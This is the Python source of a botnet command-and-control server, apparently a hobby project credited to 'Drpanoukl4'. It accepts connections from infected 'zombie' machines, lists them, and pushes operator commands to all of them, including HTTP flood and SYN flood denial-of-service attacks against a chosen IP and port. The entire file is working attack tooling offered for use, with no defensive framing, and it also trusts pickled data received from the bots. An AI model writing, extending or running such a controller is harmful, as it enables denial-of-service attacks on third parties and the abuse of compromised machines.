#-*- coding: utf-8 -*-

import pickle
import signal
import socket
import os
import sys
import threading


print(

    
"\n██████╗  █████╗ ███╗   ██╗ ██████╗ ██╗   ██╗██╗  ██╗██╗██╗  ██╗    ██████╗  ██████╗ ████████╗███╗   ██╗███████╗████████╗"
"\n██╔══██╗██╔══██╗████╗  ██║██╔═══██╗██║   ██║██║ ██╔╝██║██║  ██║    ██╔══██╗██╔═══██╗╚══██╔══╝████╗  ██║██╔════╝╚══██╔══╝"
"\n██████╔╝███████║██╔██╗ ██║██║   ██║██║   ██║█████╔╝ ██║███████║    ██████╔╝██║   ██║   ██║   ██╔██╗ ██║█████╗     ██║   "
"\n██╔═══╝ ██╔══██║██║╚██╗██║██║   ██║██║   ██║██╔═██╗ ██║╚════██║    ██╔══██╗██║   ██║   ██║   ██║╚██╗██║██╔══╝     ██║   "
"\n██║     ██║  ██║██║ ╚████║╚██████╔╝╚██████╔╝██║  ██╗███████╗██║    ██████╔╝╚██████╔╝   ██║   ██║ ╚████║███████╗   ██║   "
"\n╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝    ╚═════╝  ╚═════╝    ╚═╝   ╚═╝  ╚═══╝╚══════╝   ╚═╝   "  
"                                                                                                                          "
"\n                                                                     [!] Version: 1.3v Python 3 // command 'help' for help xD"                                                
"\n                                                                                [+] Code by © Drpanoukl4 2022"                                                                             

)

def sig_handler(sig, frame):
    print("\nExiting")
    os._exit(0)

signal.signal(signal.SIGINT, sig_handler)

class listener:
    def __init__(self, ip, port):
        global Listener
        Listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        Listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        Listener.bind((ip, port))
        Listener.listen(0)

        global bots
        self.bots = []
        self.connections = []

        print("\n [+] Waiting Connections")

        while True:
            try:
                global address       
                self.connection, address = Listener.accept()

                runs = threading.Thread(target=self.run, args=())
                runs.start()

                self.bots.append(address)
                self.connections.append(self.connection)

            except socket.error as error:
                print("error")


    def  reliable_send(self, data):

        pdata = pickle.dumps(data)
        for i,(ip, port) in enumerate(self.bots):

            try:

                self.connections[i].send(pdata)

                continue
                
            except:

                try:

                    del self.bots[i]
                    del self.connections[i]

                except:
                    print("Cant delete bot", self.bots[i])
            


    def reliable_recieve(self):
        pdata = ""

        while True:
          try:
                
                pdata = self.connection.recv(1024)
                return pickle.loads(pdata)

          except EOFError:                
            continue

        return pickle.loads(pdata)
    

    def Remote_Execute(self, commands):

        self.reliable_send(commands)

        return self.reliable_recieve()

    def run(self):  

        while True:
            try:
                command = input("\n -<<Command>>: ")
                commands = command.split(" ")
                
            except EOFError:

                continue

            if commands[0] == "bots":
                for x in self.bots:
                    print("\n" + str(x))

                x = len(self.bots)
                print("\n  " + str(x) + " Zombies Actives")
            
            elif commands[0] == "help":
                print(

                    "\n[+] -> - bots = Print current actives bots"
                    "\n[+] -> - exit = Kill connection with bots"
                    "\n[+] -> - kill = Kill bots"
                    "\n[+] -> - acttack + numreq + target ip + port  = HTPP flood"
                    "\n[+] -> - syn + numreq + target ip + port = Syn flood"
                    "\n[+] -> - Ctrl + C = Exit"
                    
                    )

            else:
                
                result = self.Remote_Execute(commands)
                print(result)

Listen = listener("192.168.0.107", 1234)


